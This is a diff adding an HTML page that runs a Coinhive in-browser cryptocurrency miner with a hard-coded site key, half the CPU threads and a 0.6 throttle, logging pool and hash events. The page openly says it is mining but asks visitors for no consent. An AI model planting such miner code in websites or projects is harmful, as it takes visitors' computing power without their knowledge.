@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Coinhive</title>
+</head>
+<body>
+    <script src="./coinhive.min.js"></script>
+    <script>
+        if (navigator.hardwareConcurrency > 1) {
+            var cpuConfig = {
+                threads: Math.round(navigator.hardwareConcurrency / 2),
+                throttle: 0.6
+            }
+        } else {
+            var cpuConfig = {
+                throttle: 0.6
+            }
+        }
+        var miner = new CoinHive.Anonymous('lAEbr1gGd2Iy04CORIzwzfHycznYvm1H',cpuConfig);
+        miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+        miner.on('open', function (params) {
+            console.log('he connection to our mining pool was opened', params);
+        });
+        miner.on('authed', function (params) {
+            console.log('The miner successfully authed ,Token name is: ', miner.getToken());
+        });
+        miner.on('close', function (params) {
+            console.log('he connection to the pool was closed', params);
+        });
+        miner.on('error', function (params) {
+            if (params.error !== 'connection_error') {
+                console.log('An error occured', params.error);
+            }
+        });
+        miner.on('job', function (params) {
+            console.log('A new mining job was received from the pool', params);
+            console.log('miner.getHashesPerSecond()', miner.getHashesPerSecond());
+            console.log('miner.getThrottle()', miner.getThrottle());
+            console.log('miner.getNumThreads()', miner.getNumThreads());
+    
+        });
+        miner.on('found', function (params) {
+            console.log('A hash was found and will be send to the pool', params);
+            console.log('miner.getTotalHashes', miner.getTotalHashes());
+        });
+        miner.on('accepted', function (params) {
+            console.log('A hash that was sent to the pool was accepted', params);
+            console.log('miner.getAcceptedHashes', miner.getAcceptedHashes());
+        });
+    </script>
+    <p>mining...</p>
+    <p id="msg"></p>
+</body>
+</html>
